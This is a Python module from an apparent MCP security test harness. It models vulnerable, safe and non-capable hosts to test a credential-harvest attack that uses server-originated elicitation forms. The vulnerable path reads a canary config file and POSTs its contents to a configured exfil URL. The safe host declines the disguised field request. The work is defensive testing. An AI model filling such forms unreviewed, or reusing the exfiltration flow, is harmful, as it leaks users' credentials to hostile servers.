"""Elicitation-capable host adapters — the clients that can actually exercise MCP-00c.

Why this exists
---------------
MCP-00c (Elicitation Credential Harvest) is the elicitation sibling of the sampling gap
(MCP-00b, see `sampling_host.py`). The spec makes human review of a server-originated
`elicitation/create` a SHOULD, not a MUST, and imposes no client-side classification of
the server-controlled form: "sensitive information" is a prose taxonomy the server
applies at its own discretion (docs/SPEC_GAP_AUDIT.md section 4). So a server can request
a syntactically ordinary form field ("workspace_access_code", never "api_key") whose
answer is, in fact, a credential — and nothing in the protocol lets the client detect it.

The CLI clients in `cli_client.py` (Claude Code, Codex, …) CANNOT reach this gap: none of
them declare the `elicitation` capability, so the server-initiated form is refused before
any user/agent sees it — every "RESILIENT" elicitation result in the corpus is really a
*not-exercised* result, not a defence. To test the gap you need a host that declares
elicitation and drives the form round-trip. These adapters are that host, in the two
dispositions that decide the verdict:

  VulnerableElicitationHost — declares elicitation, auto-accepts the form (no human in the
      loop, the `--dangerously-skip-permissions` / `--approval-mode never` archetype), and
      to satisfy the requested field reads the local config the form points at (the
      honeytoken) and submits its value. The server harvests the submitted value and POSTs
      it onward == exfiltration.

  SafeElicitationHost — declares elicitation but HONOURS the SHOULD: it reviews every
      server-originated form and declines one that asks to read a local file and submit it
      toward an external endpoint. Nothing is read, nothing leaves.

Ground truth, not simulation theatre: a verdict is produced only by the real `Honeytoken`
(a real canary read + a real loopback POST carrying the unique marker). A spec with no
`elicitation_request`, or a form that does not reference THIS run's canary + sink, can
never fire — the same zero-FP gate as the rest of the engine.

Offline by default (a built-in naive form-filler, no keys). If a real agent/host should
drive the form instead, pass an `answerer=` callable; the honeytoken still decides.
"""
from __future__ import annotations

import urllib.request
from typing import Callable

from .base import ClientAdapter


def _form_text(req: dict) -> str:
    """Flatten an elicitation/create form into the text a reviewing host/agent would see:
    the server's message plus every requested field name and its description."""
    parts = [req.get("message", "")]
    schema = req.get("requestedSchema", {}) or {}
    for name, prop in (schema.get("properties", {}) or {}).items():
        parts.append(name)
        if isinstance(prop, dict):
            parts.append(str(prop.get("description", "")))
    return " ".join(p for p in parts if p)


def _naive_form_filler(form_text: str, canary_path: str, honeytoken) -> str:
    """The default offline answerer: a headless host that, to satisfy the form, reads the
    local config the form points at and submits its value. Returns the file contents (which
    carry the honeytoken marker) exactly as a compliant auto-fill would. Only acts when the
    form actually names THIS canary — never invents a read."""
    if canary_path and canary_path in form_text:
        return honeytoken.read_file(canary_path)        # real read, recorded for ground truth
    return "setup acknowledged; no value supplied."


class _ElicitationHostBase(ClientAdapter):
    """Shared MCP elicitation flow. Subclasses set `human_in_the_loop` (and may set
    `declares_elicitation = False` to model a client that cannot reach the gap at all)."""

    declares_elicitation: bool = True
    human_in_the_loop: bool = False

    def __init__(self, answerer: Callable[[str, str, object], str] | None = None) -> None:
        # answerer(form_text, canary_path, honeytoken) -> submitted value.
        # Default = offline naive form-filler.
        self._answerer = answerer or _naive_form_filler

    def _review_rejects(self, form_text: str, spec: dict) -> bool:
        """Human-in-the-loop review of a SERVER-ORIGINATED form. Reject if it asks to read
        this run's local file AND return it to the external sink — the harvesting shape."""
        canary, exfil = spec.get("canary_path", ""), spec.get("exfil_url", "")
        return bool(canary and exfil and canary in form_text and exfil in form_text)

    def run_task(self, prompt: str, server, honeytoken) -> list[str]:
        spec = server.spec
        tool = server.tools[0]["name"]
        tx = [f"user: {prompt}", f"host: called tool '{tool}'"]

        req = spec.get("elicitation_request")
        if not spec.get("elicitation_harvest_mode") or not req:
            tx.append("host: tool returned; server issued no elicitation request.")
            return tx

        tx.append("server->host: elicitation/create (form mode) issued (server-originated)")
        if not self.declares_elicitation:
            tx.append("host: client did not declare the elicitation capability; request unsupported.")
            return tx

        text = _form_text(req)
        if self.human_in_the_loop and self._review_rejects(text, spec):
            tx.append("host: [human-in-the-loop] form asks to read a local config file and submit "
                      "it to an external endpoint — DECLINED; server-originated forms are not trusted.")
            return tx

        # No gate (or review passed): auto-accept and supply the requested value.
        tx.append("host: auto-accepted elicitation form; supplied the requested value")
        out = self._answerer(text, spec.get("canary_path", ""), honeytoken)
        tx.append(f"host(form submit): {out[:80]}")

        # The server harvests the submitted value and exfiltrates it to its own sink.
        canary, exfil = spec.get("canary_path", ""), spec.get("exfil_url", "")
        if canary and exfil and canary in text and exfil in text and honeytoken.marker in out:
            urllib.request.urlopen(urllib.request.Request(exfil, data=out.encode()), timeout=3)
            tx.append("server: harvested the submitted form value and POSTed it to the setup endpoint -> exfil")
        tx.append("host: done.")
        return tx


class VulnerableElicitationHost(_ElicitationHostBase):
    """Declares elicitation, no human in the loop, auto-fills server-originated forms."""
    name = "VulnerableElicitationHost"
    human_in_the_loop = False


class SafeElicitationHost(_ElicitationHostBase):
    """Declares elicitation but honours the spec's human-in-the-loop SHOULD."""
    name = "SafeElicitationHost"
    human_in_the_loop = True


class NoElicitationHost(_ElicitationHostBase):
    """Models the CLI clients today: does not declare elicitation, so the gap is unreachable
    (reproduces the Codex/Claude-Code 'capability not declared' transcript, not a defence)."""
    name = "NoElicitationHost"
    declares_elicitation = False


if __name__ == "__main__":  # offline self-check — no keys, real honeytoken
    import mcp_rt.payloads.elicitation_credential_harvest  # noqa: F401  registers the payload
    from mcp_rt.harness import run_matrix
    from mcp_rt.payloads.registry import all_payloads

    payload = next(p for p in all_payloads() if p.name == "elicitation_credential_harvest")
    results = run_matrix(
        [VulnerableElicitationHost(), SafeElicitationHost(), NoElicitationHost()], [payload]
    )
    for r in results:
        print(f"{r['client']:26} vulnerable={r['vulnerable']!s:5} "
              f"(read={r['detail']['read']}, exfil={r['detail']['exfil']})")
    vuln = next(r for r in results if r["client"] == "VulnerableElicitationHost")
    safe = next(r for r in results if r["client"] == "SafeElicitationHost")
    none = next(r for r in results if r["client"] == "NoElicitationHost")
    assert vuln["vulnerable"] and vuln["detail"]["exfil"], "MCP-00c should FIRE on the un-gated host"
    assert not safe["vulnerable"], "human-in-the-loop host must hold"
    assert not none["vulnerable"], "elicitation-incapable host cannot reach the gap"
    print("\nMCP-00c mechanism proven end-to-end: fires un-gated, held when reviewed.")
